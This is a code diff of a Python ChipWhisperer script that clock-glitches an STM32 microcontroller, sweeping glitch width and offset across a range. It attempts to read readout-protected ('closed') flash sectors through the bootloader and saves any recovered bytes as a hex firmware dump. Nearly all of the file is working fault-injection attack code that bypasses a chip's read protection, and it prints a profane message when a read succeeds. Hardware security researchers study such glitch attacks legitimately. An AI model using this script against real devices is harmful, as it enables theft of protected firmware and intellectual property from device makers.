@@ -9,10 +9,14 @@ PLATFORM = 'CW308_STM32F0'
 #PLATFORM = 'CW308_STM32F4'
 SCOPETYPE = 'OPENADC'
 
+import logging
 import chipwhisperer as cw
 import usb
 import time
 from chipwhisperer.hardware.naeusb.programmer_stm32fserial import supported_stm32f
+import chipwhisperer.common.results.glitch as glitch
+gc = glitch.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset"])
+cw.glitch_logger.setLevel(logging.ERROR)
 
 # Check for presence of STM32 chipset
 if (PLATFORM == 'CW308_STM32F0' or PLATFORM == 'CW308_STM32F1' or PLATFORM == 'CW308_STM32F2'  or PLATFORM == 'CW308_STM32F3' or PLATFORM == 'CW308_STM32F4' ):
@@ -96,6 +100,32 @@ mem_stop = 0x08000300
 
 ############## Code #################
 
+scope.glitch.ext_offset = 0
+
+gc.set_range("width", -49.8, 49.8)
+gc.set_range("offset", -49.8, 49.8)
+gc.set_global_step([8, 4])
+scope.glitch.repeat = 1
+scope.adc.timeout = 0.1
+
+#Basic setup
+scope.glitch.clk_src = "clkgen" # set glitch input clock
+scope.glitch.output = "clock_xor" # glitch_out = clk ^ glitch
+scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
+
+scope.io.hs2 = "glitch"  # output glitch_out on the clock line
+
+#stm32 settings
+scope.gain.gain = 45
+scope.adc.samples = 5000
+scope.adc.offset = 0
+scope.adc.basic_mode = "rising_edge"
+scope.clock.clkgen_freq = 7370000
+scope.clock.adc_src = "clkgen_x4"
+scope.trigger.triggers = "tio4"
+scope.io.tio1 = "serial_rx"
+scope.io.tio2 = "serial_tx"
+
 # string of start HEX file
 Start_of_File_Record = ':020000040800F2'
 # Extended_Linera_Address_Record = ':020000040800F2'
@@ -126,67 +156,59 @@ while mem_current < mem_stop:
     stm32f = prog.stm32prog()
     stm32f.reset()
 
-#    scope.glitch.width=10 # Values [-49.8, 49.8] 
-#    scope.glitch.offset=5 # Values [-50, 50] 
-#    scope.glitch.ext_offset=0 # Values [0, 2**32]
-    scope.glitch.repeat=5 # Values [1, 8192]    
-#    scope.glitch.trigger_src="manual" # “continuous”, “manual”, “ext_single”, “ext_continuous”
-#    print(scope.glitch)
+    # Print glitch settings
+    for glitch_setting in gc.glitch_values():
+        scope.glitch.offset = glitch_setting[1]
+        scope.glitch.width = glitch_setting[0]
 
-    print('Glitch settings:', scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset)
+        print('Glitch settings:', scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset)
 
-    try:
-        # initialize STM32 after each reset
-        stm32f.initChip()
-    except IOError:
-        print("Failed to detect chip. Check following: ")
-        print("   1. Connections and device power. ")
-        print("   2. Device has valid clock (or remove clock entirely for internal osc).")
-        print("   3. On Rev -02 CW308T-STM32Fx boards, BOOT0 is routed to PDIC.")
-        raise
+        try:
+            # initialize STM32 after each reset
+            stm32f.initChip()
+        except IOError:
+            print("Failed to detect chip. Check following: ")
+            print("   1. Connections and device power. ")
+            print("   2. Device has valid clock (or remove clock entirely for internal osc).")
+            print("   3. On Rev -02 CW308T-STM32Fx boards, BOOT0 is routed to PDIC.")
+            raise
 
-    stm32f.find()
+        stm32f.find()
 
-    boot_version = stm32f.cmdGet()
-    chip_id = stm32f.cmdGetID()
+        boot_version = stm32f.cmdGet()
+        chip_id = stm32f.cmdGetID()
 
-    for t in supported_stm32f:
-        if chip_id == t.signature:
-            print("Detected known STMF32: %s" % t.name)
-            stm32f.setChip(t)
-            print("Detected unknown STM32F ID: 0x%03x" % chip_id)
+        scope.arm()
 
-    scope.arm()
+        try:
+            # reading of closed memory sector
+            data = stm32f.cmdReadMemory(mem_current, length_of_sector)
+            print("You son of a bitch! You got it!")
+        except Exception as message:
+            message = str(message)
+            if "Can't read port" in message:
+                print('Port silence')
+                pass
+            elif 'Unknown response. 0x11: 0x0' in message:
+                print('Crashed. Reload!')
+                pass
+            elif 'NACK 0x11' in message:
+#                print('Firmware is closed!')
+                pass
+            else:
+                print('Unknown error:', message, scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset)
+                pass
 
-    try:
-        # reading of closed memory sector
-        data = stm32f.cmdReadMemory(mem_current, length_of_sector)
-    except Exception as message:
-        message = str(message)
-        if "Can't read port" in message:
-            print('Port silence')
-            pass
-        elif 'Unknown response. 0x11: 0x0' in message:
-            print('Crashed. Reload!')
-            pass
-        elif 'NACK 0x11' in message:
-            print('Firmware is closed!')
-            pass
         else:
-            print('Unknown error:', message, scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset)
-            pass
-
-    else:
-        data_to_out = data_dividing_from_256_to_32_bytes (data, mem_current)
-        print(data_to_out)
-        output_to_file_buffer += data_to_out
-        mem_current += length_of_sector
+            data_to_out = data_dividing_from_256_to_32_bytes (data, mem_current)
+            print(data_to_out)
+            output_to_file_buffer += data_to_out
+            mem_current += length_of_sector
 
 output_to_file_buffer += End_of_File_Record + '\n'
 send_to_file(output_to_file_buffer, File_name, directory)
-print('success')
+print('done writing file')
 print("--- %s seconds ---" % (time.time() - start_time))
-
 # Cleanup 
 scope.dis()
 target.dis()
